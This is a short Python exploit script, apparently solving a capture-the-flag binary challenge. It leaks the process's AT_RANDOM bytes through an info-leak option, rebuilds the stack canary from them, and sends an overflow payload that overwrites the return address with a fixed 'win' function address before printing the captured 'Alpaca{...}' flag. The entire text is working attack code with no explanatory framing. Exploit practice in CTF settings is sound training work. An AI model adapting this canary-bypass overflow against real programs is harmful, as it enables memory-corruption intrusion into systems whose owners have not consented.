import os,sys,time,re,select,struct
WIN=0x40135f
buf=b""
def pump(to):
    global buf; end=time.time()+to
    while time.time()<end:
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
def until(sub,to=6):
    global buf; end=time.time()+to
    while sub.encode() not in buf and time.time()<end:
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
until("type> ")
os.write(1,b"25\n")
until("values: ",6); until("\n",3)
m=re.search(rb"values:\s*([0-9a-fA-F]{32})",buf)
if not m:
    sys.stderr.write("NO LEAK buf=%r\n"%buf[-200:]); sys.exit(1)
rnd=bytes.fromhex(m.group(1).decode())
canary=bytearray(rnd[:8]); canary[0]=0
canary=bytes(canary)
sys.stderr.write("AT_RANDOM=%s canary=%s\n"%(rnd.hex(),canary.hex()))
until("message> ",6)
payload=b"A"*8+canary+b"B"*8+struct.pack("<Q",WIN)
os.write(1,payload)
pump(4)
sys.stderr.write("RECV=%r\n"%buf[-300:])
mm=re.search(rb"Alpaca\{[^}]*\}",buf)
if mm: sys.stderr.write("AUXFLAG=%s\n"%mm.group(0).decode())
